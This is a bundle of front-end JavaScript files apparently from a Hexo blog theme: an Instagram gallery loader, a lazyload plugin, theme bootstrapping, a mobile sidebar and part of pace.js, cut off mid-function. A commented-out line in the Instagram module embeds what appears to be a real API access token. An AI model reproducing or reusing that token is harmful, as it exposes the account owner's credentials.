var spinner = exports.spinner = '<svg class="gitment-spinner-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50"><path d="M25 18c-.6 0-1-.4-1-1V9c0-.6.4-1 1-1s1 .4 1 1v8c0 .6-.4 1-1 1z"/><path opacity=".3" d="M25 42c-.6 0-1-.4-1-1v-8c0-.6.4-1 1-1s1 .4 1 1v8c0 .6-.4 1-1 1z"/><path opacity=".3" d="M29 19c-.2 0-.3 0-.5-.1-.4-.3-.6-.8-.3-1.3l4-6.9c.3-.4.8-.6 1.3-.3.4.3.6.8.3 1.3l-4 6.9c-.2.2-.5.4-.8.4z"/><path opacity=".3" d="M17 39.8c-.2 0-.3 0-.5-.1-.4-.3-.6-.8-.3-1.3l4-6.9c.3-.4.8-.6 1.3-.3.4.3.6.8.3 1.3l-4 6.9c-.2.2-.5.4-.8.4z"/><path opacity=".93" d="M21 19c-.3 0-.6-.2-.8-.5l-4-6.9c-.3-.4-.1-1 .3-1.3.4-.3 1-.1 1.3.3l4 6.9c.3.4.1 1-.3 1.3-.2.2-.3.2-.5.2z"/><path opacity=".3" d="M33 39.8c-.3 0-.6-.2-.8-.5l-4-6.9c-.3-.4-.1-1 .3-1.3.4-.3 1-.1 1.3.3l4 6.9c.3.4.1 1-.3 1.3-.2.1-.3.2-.5.2z"/><path opacity=".65" d="M17 26H9c-.6 0-1-.4-1-1s.4-1 1-1h8c.6 0 1 .4 1 1s-.4 1-1 1z"/><path opacity=".3" d="M41 26h-8c-.6 0-1-.4-1-1s.4-1 1-1h8c.6 0 1 .4 1 1s-.4 1-1 1z"/><path opacity=".86" d="M18.1 21.9c-.2 0-.3 0-.5-.1l-6.9-4c-.4-.3-.6-.8-.3-1.3.3-.4.8-.6 1.3-.3l6.9 4c.4.3.6.8.3 1.3-.2.3-.5.4-.8.4z"/><path opacity=".3" d="M38.9 33.9c-.2 0-.3 0-.5-.1l-6.9-4c-.4-.3-.6-.8-.3-1.3.3-.4.8-.6 1.3-.3l6.9 4c.4.3.6.8.3 1.3-.2.3-.5.4-.8.4z"/><path opacity=".44" d="M11.1 33.9c-.3 0-.6-.2-.8-.5-.3-.4-.1-1 .3-1.3l6.9-4c.4-.3 1-.1 1.3.3.3.4.1 1-.3 1.3l-6.9 4c-.1.2-.3.2-.5.2z"/><path opacity=".3" d="M31.9 21.9c-.3 0-.6-.2-.8-.5-.3-.4-.1-1 .3-1.3l6.9-4c.4-.3 1-.1 1.3.3.3.4.1 1-.3 1.3l-6.9 4c-.2.2-.3.2-.5.2z"/></svg>';

/***/ })
/******/ ]);
//# sourceMappingURL=gitment.browser.js.map
var Instagram = (function(){

	var _collection = [];

	var preLoad = function(data){
		for(var em in data){
			for(var i=0,len=data[em].srclist.length;i<len;i++){
				var src = data[em].bigSrclist[i];
				var img = new Image();
				img.src = src;
			}
		}
	}

	var render = function(data){
		for(var em in data){
			var liTmpl = "";
			for(var i=0,len=data[em].srclist.length;i<len;i++){
				liTmpl += '<li>\
								<div class="img-box">\
									<a class="img-bg" rel="example_group" href="'+data[em].bigSrclist[i]+'" title="'+data[em].text[i]+'"></a>\
									<img lazy-src="'+data[em].srclist[i]+'" alt="">\
								</div>\
							</li>';
			}
			$('<section class="archives album"><h1 class="year">'+data[em].year+'<em>'+data[em].month+'月</em></h1>\
				<ul class="img-box-ul">'+liTmpl+'</ul>\
				</section>').appendTo($(".instagram"));
		}

		$(".instagram").lazyload();
		changeSize();

		setTimeout(function(){
			preLoad(data);
		},3000);
		
		$("a[rel=example_group]").fancybox();
	}

	var replacer = function(str){
		if(str.indexOf("outbound-distilleryimage") >= 0 ){
			var cdnNum = str.match(/outbound-distilleryimage([\s\S]*?)\//)[1];
			var arr = str.split("/");
			return "http://distilleryimage"+cdnNum+".ak.instagram.com/"+arr[arr.length-1];
		}else{
			var url = "http://photos-g.ak.instagram.com/hphotos-ak-xpf1/";
			var arr = str.split("/");
			return url+arr[arr.length-1];
		}
	}

	var ctrler = function(data){
		var imgObj = {};
		for(var i=0,len=data.length;i<len;i++){
			var d = new Date(data[i].created_time*1000);
			var y = d.getFullYear();
			var m = d.getMonth()+1;
			var src = replacer(data[i].images.low_resolution.url);
			var bigSrc = replacer(data[i].images.standard_resolution.url);
			var text = data[i].caption ? data[i].caption.text : ''; // data[i].caption 有可能为 null
			var key = y+"-"+m;
			if(imgObj[key]){
				imgObj[key].srclist.push(src);
				imgObj[key].bigSrclist.push(bigSrc);
				imgObj[key].text.push(text);
			}else{
				imgObj[key] = {
					year:y,
					month:m,
					srclist:[bigSrc],
					bigSrclist:[bigSrc],
					text:[text]
				}
			}
		}
		render(imgObj);
	}

	var getList = function(url){
		$(".open-ins").html("图片来自instagram，正在加载中…");
		$.ajax({
			url: url,
			type:"GET",
			dataType:"jsonp",
			success:function(re){
				if(re.meta.code == 200){
					_collection = _collection.concat(re.data);
					var next = re.pagination.next_url;
					if(next){
						getList(next);
					}else{
						$(".open-ins").html("图片来自instagram，点此访问");
						ctrler(_collection);
					}
				}else{
					alert("access_token timeout!");
				}
			}
		});
	}
	

	var changeSize = function(){	
		if($(document).width() <= 600){
			$(".img-box").css({"width":"auto", "height":"auto"});
		}else{
			var width = $(".img-box-ul").width();
			var size = Math.max(width*0.26, 157);
			$(".img-box").width(size).height(size);
		}
	}

	var bind = function(){
		$(window).resize(function(){
			changeSize();
		});
	}

	return {
		init:function(){
			//getList("https://api.instagram.com/v1/users/438522285/media/recent/?access_token=438522285.2082eef.ead70f432f444a2e8b1b341617637bf6&count=100");
			var insid = $(".instagram").attr("data-client-id");
            var userId = $(".instagram").attr("data-user-id");

			if(!insid){
				alert("Didn't set your instagram client_id.\nPlease see the info on the console of your brower.");
				console.log("Please open 'http://instagram.com/developer/clients/manage/' to get your client-id.");
				return;
			}
			getList("https://api.instagram.com/v1/users/"+ userId +"/media/recent/?client_id="+insid+"&count=100");
			bind();
		}
	}
})();
$(function(){
	Instagram.init();
})

/**
 * @author littenli
 * @date 2014-03-10 version 0.2
 * @description 图片延时加载，裂图替换，图片错误上报处理
 * @update 增加非可视区域延时加载
 * @example $(".container").lazy(options);
 *          遍历$(".container")节点内的img节点，都应用lazyload；若此节点为img节点，只应用此节点
 *          options.srcSign {String} 可为空.img节点约定的src标志，默认为lazy-src；响应img节点为：<img lazy-src="img/hello.jpg" />
 *          options.errCallBack {Function} 可为空.提供img加载失败回调，供业务额外去处理加载失败逻辑
 *          options.container {Dom} 提供容器节点内可视区域的加载能力，默认为window
 */
(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        define(['jquery'], factory);
    } else {
        factory(root['jQuery']);
    }
}(this, function ($) {

    $.fn.lazyload = function(options) {
        return this.each(function() {

            options = options || {};
            var defualts = {};

            var opts = $.extend({}, defualts, options);
            var obj = $(this);
            var dom = this;

            var srcSign = options.srcSign || "lazy-src";
            var errCallBack = options.errCallBack || function(){};
            var container = options.container || $(window);

            /**
             * @description src正常
             */
            var imgload = function (e, target) {
                //todo: 上报
            }

            /**
             * @description src失效
             */
            var imgerr = function (e, target, fn, src) {
                if(target[0].src && (target[0].src.indexOf("img-err.png")>0 || target[0].src.indexOf("img-err2.png")>0)){
                    return ;
                }
                var w = target.width();
                var h = target.height();
                target[0].src = yiliaConfig.rootUrl + "img/img-err.png";

                fn();
                //todo: 上报
            };

            var tempImg = function(target){
                var w = target.width();
                var h = target.height();
                var t = target.offset().top;
                var l = target.offset().left;
                var tempDom = target.clone().addClass("lazy-loding").insertBefore(target);
                tempDom[0].src = yiliaConfig.rootUrl + "img/img-loading.png";
                target.hide();
            }
            /**
             * @description src替换，loading过程中添加类lazy-loading;
             */
            var setSrc = function(target, srcSign, errCallBack){

                if(target.attr("src"))return ;

                if(options.cache == true){
                    console.log(target);
                    //存进localstorage
                    var canvas1 = document.getElementById('canvas1');
                    var ctx1 = canvas1.getContext('2d');
                    var imageData;

                    image = new Image();
                    image.src = target.attr(srcSign);
                    image.onload=function(){
                        ctx1.drawImage(image,0,0);
                        imageData = ctx1.getImageData(0,0,500,250);
                        console.log(imageData);
                    }

                }else{
                    tempImg(target);

                    var src = target.attr(srcSign);
                    target[0].onerror = function (e) {
                        imgerr(e, target, errCallBack, src);
                    };
                    target[0].onload = function (e) {
                        target.parent().find(".lazy-loding").remove();
                        target.show();
                        imgload(e, target);
                    }
                    target[0].src = src;
                }
            }

            /**
             * @description 重组
             */
            opts.cache = [];

            if(dom.tagName == "IMG"){
                var data = {
                    obj: obj,
                    tag: "img",
                    url: obj.attr(srcSign)
                };
                opts.cache.push(data);
            }else{
                var imgArr = obj.find("img");
                imgArr.each(function(index) {
                    var node = this.nodeName.toLowerCase(), url = $(this).attr(srcSign);
                    //重组
                    var data = {
                        obj: imgArr.eq(index),
                        tag: node,
                        url: url
                    };
                    opts.cache.push(data);
                });
            }


            //动态显示数据
            var scrollHandle = function() {
                var contHeight = container.height();
                var contop;
                if ($(window).get(0) === window) {
                    contop = $(window).scrollTop();
                } else {
                    contop = container.offset().top;
                }
                $.each(opts.cache, function(i, data) {
                    var o = data.obj, tag = data.tag, url = data.url, post, posb;
                    if (o) {
                        post = o.offset().top - contop, post + o.height();

                        if ((post >= 0 && post < contHeight) || (posb > 0 && posb <= contHeight)) {
                            if (url) {
                                //在浏览器窗口内
                                if (tag === "img") {
                                    //改变src
                                    setSrc(o, srcSign, errCallBack);
                                }
                            }
                            data.obj = null;
                        }
                    }
                });
            }

            //加载完毕即执行
            scrollHandle();
            //滚动执行
            container.bind("scroll", scrollHandle);
            container.bind("resize", scrollHandle);

        });
    };

}));

require([], function (){

    var isMobileInit = false;
    var loadMobile = function(){
        require([yiliaConfig.rootUrl + 'js/mobile.js'], function(mobile){
            mobile.init();
            isMobileInit = true;
        });
    }
    var isPCInit = false;
    var loadPC = function(){
        require([yiliaConfig.rootUrl + 'js/pc.js'], function(pc){
            pc.init();
            isPCInit = true;
        });
    }

    var browser={
        versions:function(){
        var u = window.navigator.userAgent;
        return {
            trident: u.indexOf('Trident') > -1, //IE内核
            presto: u.indexOf('Presto') > -1, //opera内核
            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
            iPad: u.indexOf('iPad') > -1, //是否为iPad
            webApp: u.indexOf('Safari') == -1 ,//是否为web应用程序，没有头部与底部
            weixin: u.indexOf('MicroMessenger') == -1 //是否为微信浏览器
            };
        }()
    }

    $(window).bind("resize", function(){
        if(isMobileInit && isPCInit){
            $(window).unbind("resize");
            return;
        }
        var w = $(window).width();
        if(w >= 700){
            loadPC();
        }else{
            loadMobile();
        }
    });

    if(browser.versions.mobile === true || $(window).width() < 700){
        loadMobile();
    }else{
        loadPC();
    }

    //是否使用fancybox
    if(yiliaConfig.fancybox === true){
        require([yiliaConfig.rootUrl + 'fancybox/jquery.fancybox.js'], function(pc){
            var isFancy = $(".isFancy");
            if(isFancy.length != 0){
                var imgArr = $(".article-inner img");
                for(var i=0,len=imgArr.length;i<len;i++){
                    var src = imgArr.eq(i).attr("src");
                    var title = imgArr.eq(i).attr("alt");
                    imgArr.eq(i).replaceWith("<a href='"+src+"' title='"+title+"' rel='fancy-group' class='fancy-ctn fancybox'><img src='"+src+"' title='"+title+"'></a>");
                }
                $(".article-inner .fancy-ctn").fancybox();
            }
        });

    }
    //是否开启动画
    if(yiliaConfig.animate === true){

        require([yiliaConfig.rootUrl + 'js/jquery.lazyload.js'], function(){
            //avatar
            $(".js-avatar").attr("src", $(".js-avatar").attr("lazy-src"));
            $(".js-avatar")[0].onload = function(){
                $(".js-avatar").addClass("show");
            }
        });

      if(yiliaConfig.isHome === true) {
        // 滚动条监听使用scrollreveal.js
        // https://github.com/jlmakes/scrollreveal.js
        // 使用cdn[//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js]
        require([
          '//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js'
        ], function (ScrollReveal) {
          // 更多animation:
          // http://daneden.github.io/animate.css/
          var animationNames = [
            "pulse", "fadeIn","fadeInRight", "flipInX", "lightSpeedIn","rotateInUpLeft", "slideInUp","zoomIn",
            ],
            len = animationNames.length,
            randomAnimationName = animationNames[Math.ceil(Math.random() * len) - 1];

          // ie9 不支持css3 keyframe动画, safari不支持requestAnimationFrame, 不使用随机动画，切回原来的动画
          if (!window.requestAnimationFrame) {
              $('.body-wrap > article').css({opacity: 1});

              if (navigator.userAgent.match(/Safari/i)) {
                  function showArticle(){
                      $(".article").each(function(){
                          if( $(this).offset().top <= $(window).scrollTop()+$(window).height() && !($(this).hasClass('show')) ) {
                              $(this).removeClass("hidden").addClass("show");
                              $(this).addClass("is-hiddened");
                          }else{
                              if(!$(this).hasClass("is-hiddened")){
                                  $(this).addClass("hidden");
                              }
                          }
                      });
                  }
                  $(window).on('scroll', function(){
                      showArticle();
                  });
                  showArticle();
              }
              return;
          }
          // document.body有些浏览器不支持监听scroll，所以使用默认的document.documentElement
          ScrollReveal({
            duration: 0,
            afterReveal: function (domEl) {
              // safari不支持requestAnimationFrame不支持document.documentElement的onscroll所以这里不会执行
              // 初始状态设为opacity: 0, 动画效果更平滑一些(由于脚本加载是异步，页面元素渲染后在执行动画，感觉像是延时)
              $(domEl).addClass('animated ' + randomAnimationName).css({opacity: 1});
            }
          }).reveal('.body-wrap > article');

        });
      } else {
        $('.body-wrap > article').css({opacity: 1});
      }

    }

    //是否新窗口打开链接
    if(yiliaConfig.open_in_new == true){
        $(".article a[href]").attr("target", "_blank")
    }
    $(".archive-article-title").attr("target", "_blank");
});
define([], function(){
    var _isShow = false;
    var $tag, $aboutme, $friends;

    var ctn,radio,scaleW,idx,basicwrap;

    //第一步 -- 初始化
    var reset = function() {
        //设定窗口比率
        radio = document.body.scrollHeight/document.body.scrollWidth;
        //设定一页的宽度
        scaleW = document.body.scrollWidth;
        //设定初始的索引值
        idx = 0;
    };
    //第一步 -- 组合
    var combine = function(){
        if($tag){
            document.getElementById("js-mobile-tagcloud").innerHTML = $tag.innerHTML;
        }
        if($aboutme){
            document.getElementById("js-mobile-aboutme").innerHTML = $aboutme.innerHTML;
        }
        if($friends){
            document.getElementById("js-mobile-friends").innerHTML = $friends.innerHTML;
        }
    }
    //第三步 -- 根据数据渲染DOM
    var renderDOM = function(){
        //生成节点
        var $viewer = document.createElement("div");
        $viewer.id = "viewer";
        $viewer.className = "hide";
        $tag = document.getElementById("js-tagcloud");
        $aboutme = document.getElementById("js-aboutme");
        $friends = document.getElementById("js-friends");
        var tagStr = $tag?'<span class="viewer-title">标签</span><div class="viewer-div tagcloud" id="js-mobile-tagcloud"></div>':"";
        var friendsStr = $friends?'<span class="viewer-title">友情链接</span><div class="viewer-div friends" id="js-mobile-friends"></div>':"";
        var aboutmeStr = $aboutme?'<span class="viewer-title">关于我</span><div class="viewer-div aboutme" id="js-mobile-aboutme"></div>':"";

        $viewer.innerHTML = '<div id="viewer-box">\
        <div class="viewer-box-l">\
            <div class="viewer-box-wrap">'+aboutmeStr+friendsStr+tagStr+'</div>\
        </div>\
        <div class="viewer-box-r"></div>\
        </div>';

        //主要图片节点
        document.getElementsByTagName("body")[0].appendChild($viewer);
        var wrap = document.getElementById("viewer-box");
        basicwrap = wrap;
        wrap.style.height = document.body.scrollHeight + 'px';
    };

    var show = function(target, idx){
        document.getElementById("viewer").className = "";
        setTimeout(function(){
            basicwrap.className = "anm-swipe";
        },0);
        _isShow = true;
        document.ontouchstart=function(e){
            if(e.target.tagName != "A"){
                return false;
            }
        }
    }

    var hide = function(){
        document.getElementById("viewer-box").className = "";
        _isShow = false;
        document.ontouchstart=function(){
            return true;
        }
    }

    //第四步 -- 绑定 DOM 事件
    var bindDOM = function(){
        var scaleW = scaleW;
        
        //滑动隐藏
        document.getElementById("viewer-box").addEventListener("webkitTransitionEnd", function(){

            if(_isShow == false){
                document.getElementById("viewer").className = "hide";
                _isShow = true;
            }else{
            }
            
        }, false);

        //点击展示和隐藏
        ctn.addEventListener("touchend", function(){
            show();
        }, false);

        var $right = document.getElementsByClassName("viewer-box-r")[0];
        var touchStartTime;
        var touchEndTime;
        $right.addEventListener("touchstart", function(){
            touchStartTime = + new Date();
        }, false);
        $right.addEventListener("touchend", function(){
            touchEndTime = + new Date();
            if(touchEndTime - touchStartTime < 300){
                hide();
            }
            touchStartTime = 0;
            touchEndTime = 0;
        }, false);

        //滚动样式
        var $overlay = $("#mobile-nav .overlay");
        var $header = $(".js-mobile-header");
        window.onscroll = function(){
            var scrollTop = document.documentElement.scrollTop + document.body.scrollTop;
            if(scrollTop >= 69){
                $overlay.addClass("fixed");
            }else{
                $overlay.removeClass("fixed");
            }
            if(scrollTop >= 160){
                $header.removeClass("hide").addClass("fixed");
            }else{
                $header.addClass("hide").removeClass("fixed");
            }
        };
        $header[0].addEventListener("touchstart", function(){
            $('html, body').animate({scrollTop:0}, 'slow');
        }, false);
    };

    var resetTags = function(){
        var tags = $(".tagcloud a");
        tags.css({"font-size": "12px"});
        for(var i=0,len=tags.length; i<len; i++){
            var num = tags.eq(i).html().length % 5 +1;
            tags[i].className = "";
            tags.eq(i).addClass("color"+num);
        }
    }

    return{
        init: function(){
            //构造函数需要的参数
            ctn = document.getElementsByClassName("slider-trigger")[0];
            //构造四步
            reset();
            renderDOM();
            combine();
            bindDOM();
            resetTags();
        }
    }
})
(function() {
  var AjaxMonitor, Bar, DocumentMonitor, ElementMonitor, ElementTracker, EventLagMonitor, Evented, Events, NoTargetError, Pace, RequestIntercept, SOURCE_KEYS, Scaler, SocketRequestTracker, XHRRequestTracker, animation, avgAmplitude, bar, cancelAnimation, cancelAnimationFrame, defaultOptions, extend, extendNative, getFromDOM, getIntercept, handlePushState, ignoreStack, init, now, options, requestAnimationFrame, result, runAnimation, scalers, shouldIgnoreURL, shouldTrack, source, sources, uniScaler, _WebSocket, _XDomainRequest, _XMLHttpRequest, _i, _intercept, _len, _pushState, _ref, _ref1, _replaceState,
    __slice = [].slice,
    __hasProp = {}.hasOwnProperty,
    __extends = function(child, parent) { for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; },
    __indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; };

  defaultOptions = {
    catchupTime: 100,
    initialRate: .03,
    minTime: 250,
    ghostTime: 100,
    maxProgressPerFrame: 20,
    easeFactor: 1.25,
    startOnPageLoad: true,
    restartOnPushState: true,
    restartOnRequestAfter: 500,
    target: 'body',
    elements: {
      checkInterval: 100,
      selectors: ['body']
    },
    eventLag: {
      minSamples: 10,
      sampleCount: 3,
      lagThreshold: 3
    },
    ajax: {
      trackMethods: ['GET'],
      trackWebSockets: true,
      ignoreURLs: []
    }
  };

  now = function() {
    var _ref;
    return (_ref = typeof performance !== "undefined" && performance !== null ? typeof performance.now === "function" ? performance.now() : void 0 : void 0) != null ? _ref : +(new Date);
  };

  requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;

  cancelAnimationFrame = window.cancelAnimationFrame || window.mozCancelAnimationFrame;

  if (requestAnimationFrame == null) {
    requestAnimationFrame = function(fn) {
      return setTimeout(fn, 50);
    };
    cancelAnimationFrame = function(id) {
      return clearTimeout(id);
    };
  }

  runAnimation = function(fn) {
    var last, tick;
    last = now();
    tick = function() {
      var diff;
      diff = now() - last;
      if (diff >= 33) {
        last = now();
        return fn(diff, function() {
          return requestAnimationFrame(tick);
        });
      } else {
        return setTimeout(tick, 33 - diff);
      }
    };
    return tick();
  };

  result = function() {
    var args, key, obj;
    obj = arguments[0], key = arguments[1], args = 3 <= arguments.length ? __slice.call(arguments, 2) : [];
    if (typeof obj[key] === 'function') {
      return obj[key].apply(obj, args);
    } else {
      return obj[key];
    }
  };

  extend = function() {
    var key, out, source, sources, val, _i, _len;
    out = arguments[0], sources = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
    for (_i = 0, _len = sources.length; _i < _len; _i++) {
      source = sources[_i];
      if (source) {
        for (key in source) {
          if (!__hasProp.call(source, key)) continue;
          val = source[key];
          if ((out[key] != null) && typeof out[key] === 'object' && (val != null) && typeof val === 'object') {
            extend(out[key], val);
          } else {
            out[key] = val;
          }
        }
      }
    }
    return out;
  };

  avgAmplitude = function(arr) {
    var count, sum, v, _i, _len;
    sum = count = 0;
    for (_i = 0, _len = arr.length; _i < _len; _i++) {
      v = arr[_i];
      sum += Math.abs(v);
      count++;
    }
    return sum / count;
  };

  getFromDOM = function(key, json) {
    var data, e, el;
    if (key == null) {
      key = 'options';
    }
    if (json == null) {
      json = true;
    }
    el = document.querySelector("[data-pace-" + key + "]");
    if (!el) {
      return;
    }
    data = el.getAttribute("data-pace-" + key);
    if (!json) {
      return data;
    }
    try {
      return JSON.parse(data);
    } catch (_error) {
      e = _error;
      return typeof console !== "undefined" && console !== null ? console.error("Error parsing inline pace options", e) : void 0;
    }
  };

  Evented = (function() {
    function Evented() {}

    Evented.prototype.on = function(event, handler, ctx, once) {
      var _base;
      if (once == null) {
        once = false;
      }
      if (this.bindings == null) {
        this.bindings = {};
      }
      if ((_base = this.bindings)[event] == null) {
        _base[event] = [];
      }
      return this.bindings[event].push({
        handler: handler,
        ctx: ctx,
        once: once
      });
    };

    Evented.prototype.once = function(event, handler, ctx) {
      return this.on(event, handler, ctx, true);
    };

    Evented.prototype.off = function(event, handler) {
      var i, _ref, _results;
      if (((_ref = this.bindings) != null ? _ref[event] : void 0) == null) {
        return;
      }
      if (handler == null) {
        return delete this.bindings[event];
      } else {
        i = 0;
        _results = [];
        while (i < this.bindings[event].length) {
          if (this.bindings[event][i].handler === handler) {
            _results.push(this.bindings[event].splice(i, 1));
          } else {
            _results.push(i++);
          }
        }
        return _results;
      }
    };

    Evented.prototype.trigger = function() {
      var args, ctx, event, handler, i, once, _ref, _ref1, _results;
      event = arguments[0], args = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
      if ((_ref = this.bindings) != null ? _ref[event] : void 0) {
        i = 0;
        _results = [];
        while (i < this.bindings[event].length) {
          _ref1 = this.bindings[event][i], handler = _ref1.handler, ctx = _ref1.ctx, once = _ref1.once;
          handler.apply(ctx != null ? ctx : this, args);
          if (once) {
            _results.push(this.bindings[event].splice(i, 1));
          } else {
            _results.push(i++);
          }
        }
        return _results;
      }
    };

    return Evented;

  })();

  Pace = window.Pace || {};

  window.Pace = Pace;

  extend(Pace, Evented.prototype);

  options = Pace.options = extend({}, defaultOptions, window.paceOptions, getFromDOM());

  _ref = ['ajax', 'document', 'eventLag', 'elements'];
  for (_i = 0, _len = _ref.length; _i < _len; _i++) {
    source = _ref[_i];
    if (options[source] === true) {
      options[source] = defaultOptions[source];
    }
  }

  NoTargetError = (function(_super) {
    __extends(NoTargetError, _super);

    function NoTargetError() {
      _ref1 = NoTargetError.__super__.constructor.apply(this, arguments);
      return _ref1;
    }

    return NoTargetError;

  })(Error);

  Bar = (function() {
    function Bar() {
      this.progress = 0;
    }

    Bar.prototype.getElement = function() {
      var targetElement;
      if (this.el == null) {
        targetElement = document.querySelector(options.target);
        if (!targetElement) {
          throw new NoTargetError;
        }
        this.el = document.createElement('div');
        this.el.className = "pace pace-active";
        document.body.className = document.body.className.replace(/pace-done/g, '');
        document.body.className += ' pace-running';
        this.el.innerHTML = '<div class="pace-progress">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>';
        if (targetElement.firstChild != null) {
          targetElement.insertBefore(this.el, targetElement.firstChild);
        } else {
          targetElement.appendChild(this.el);
        }
      }
      return this.el;
    };

    Bar.prototype.finish = function() {
      var el;
      el = this.getElement();
      el.className = el.className.replace('pace-active', '');
      el.className += ' pace-inactive';
      document.body.className = document.body.className.replace('pace-running', '');
      return document.body.className += ' pace-done';
    };

    Bar.prototype.update = function(prog) {
      this.progress = prog;
      return this.render();
    };

    Bar.prototype.destroy = function() {
      try {
        this.getElement().parentNode.removeChild(this.getElement());
      } catch (_error) {
        NoTargetError = _error;
      }
      return this.el = void 0;
    };

    Bar.prototype.render = function() {
      var el, key, progressStr, transform, _j, _len1, _ref2;
      if (document.querySelector(options.target) == null) {
        return false;
      }
      el = this.getElement();
      transform = "translate3d(" + this.progress + "%, 0, 0)";
      _ref2 = ['webkitTransform', 'msTransform', 'transform'];
      for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
        key = _ref2[_j];
        el.children[0].style[key] = transform;
      }
      if (!this.lastRenderedProgress || this.lastRenderedProgress | 0 !== this.progress | 0) {
        el.children[0].setAttribute('data-progress-text', "" + (this.progress | 0) + "%");
        if (this.progress >= 100) {
          progressStr = '99';
        } else {
          progressStr = this.progress < 10 ? "0" : "";
          progressStr += this.progress | 0;
        }
        el.children[0].setAttribute('data-progress', "" + progressStr);
      }
      return this.lastRenderedProgress = this.progress;
    };

    Bar.prototype.done = function() {
      return this.progress >= 100;
    };

    return Bar;

  })();

  Events = (function() {
    function Events() {
      this.bindings = {};
    }

    Events.prototype.trigger = function(name, val) {
      var binding, _j, _len1, _ref2, _results;
      if (this.bindings[name] != null) {
        _ref2 = this.bindings[name];
        _results = [];
        for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
          binding = _ref2[_j];
          _results.push(binding.call(this, val));
        }
        return _results;
      }
    };

    Events.prototype.on = function(name, fn) {
      var _base;
      if ((_base = this.bindings)[name] == null) {
        _base[name] = [];
      }
      return this.bindings[name].push(fn);
    };

    return Events;

  })();

  _XMLHttpRequest = window.XMLHttpRequest;

  _XDomainRequest = window.XDomainRequest;

  _WebSocket = window.WebSocket;

  extendNative = function(to, from) {
    var e, key, _results;
    _results = [];
    for (key in from.prototype) {
      try {
        if ((to[key] == null) && typeof from[key] !== 'function') {
          if (typeof Object.defineProperty === 'function') {
            _results.push(Object.defineProperty(to, key, {
              get: function() {
                return from.prototype[key];
              },
              configurable: true,
              enumerable: true
            }));
          } else {
            _results.push(to[key] = from.prototype[key]);
          }
        } else {
          _results.push(void 0);
        }
      } catch (_error) {
        e = _error;
      }
    }
    return _results;
  };

  ignoreStack = [];

  Pace.ignore = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
    ignoreStack.unshift('ignore');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  Pace.track = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
    ignoreStack.unshift('track');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  shouldTrack = function(method) {
    var _ref2;
    if (method == null) {
      method = 'GET';
    }
    if (ignoreStack[0] === 'track') {
      return 'force';
    }
    if (!ignoreStack.length && options.ajax) {
      if (method === 'socket' && options.ajax.trackWebSockets) {
        return true;
      } else if (_ref2 = method.toUpperCase(), __indexOf.call(options.ajax.trackMethods, _ref2) >= 0) {
        return true;
      }
    }
    return false;
  };

  RequestIntercept = (function(_super) {
    __extends(RequestIntercept, _super);

    function RequestIntercept() {
      var monitorXHR,
        _this = this;
      RequestIntercept.__super__.constructor.apply(this, arguments);
      monitorXHR = function(req) {
        var _open;
        _open = req.open;
        return req.open = function(type, url, async) {
          if (shouldTrack(type)) {
            _this.trigger('request', {
              type: type,
              url: url,
              request: req
            });
          }
          return _open.apply(req, arguments);
        };
      };
      window.XMLHttpRequest = function(flags) {
        var req;
        req = new _XMLHttpRequest(flags);
        monitorXHR(req);
        return req;
      };
      try {
        extendNative(window.XMLHttpRequest, _XMLHttpRequest);
      } catch (_error) {}
      if (_XDomainRequest != null) {
        window.XDomainRequest = function() {
          var req;
          req = new _XDomainRequest;
          monitorXHR(req);
          return req;
        };
        try {
          extendNative(window.XDomainRequest, _XDomainRequest);
        } catch (_error) {}
      }
      if ((_WebSocket != null) && options.ajax.trackWebSockets) {
        window.WebSocket = function(url, protocols) {
          var req;
          if (protocols != null) {
            req = new _WebSocket(url, protocols);
          } else {
            req = new _WebSocket(url);
          }
          if (shouldTrack('socket')) {
            _this.trigger('request', {
              type: 'socket',
              url: url,
              protocols: protocols,
              request: req
            });
          }
          return req;
        };
        try {
          extendNative(window.WebSocket, _WebSocket);
        } catch (_error) {}
      }
    }

    return RequestIntercept;

  })(Events);

  _intercept = null;

  getIntercept = function() {
    if (_intercept == null) {
      _intercept = new RequestIntercept;
    }
    return _intercept;
  };

  shouldIgnoreURL = function(url) {
    var pattern, _j, _len1, _ref2;
    _ref2 = options.ajax.ignoreURLs;
    for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
      pattern = _ref2[_j];
      if (typeof pattern === 'string') {
        if (url.indexOf(pattern) !== -1) {
          return true;
        }
      } else {
        if (pattern.test(url)) {
          return true;
        }
      }
    }
    return false;
  };

  getIntercept().on('request', function(_arg) {
    var after, args, request, type, url;
    type = _arg.type, request = _arg.request, url = _arg.url;
    if (shouldIgnoreURL(url)) {
      return;
    }
    if (!Pace.running && (options.restartOnRequestAfter !== false || shouldTrack(type) === 'force')) {
      args = arguments;
      after = options.restartOnRequestAfter || 0;
      if (typeof after === 'boolean') {
        after = 0;
      }
      return setTimeout(function() {
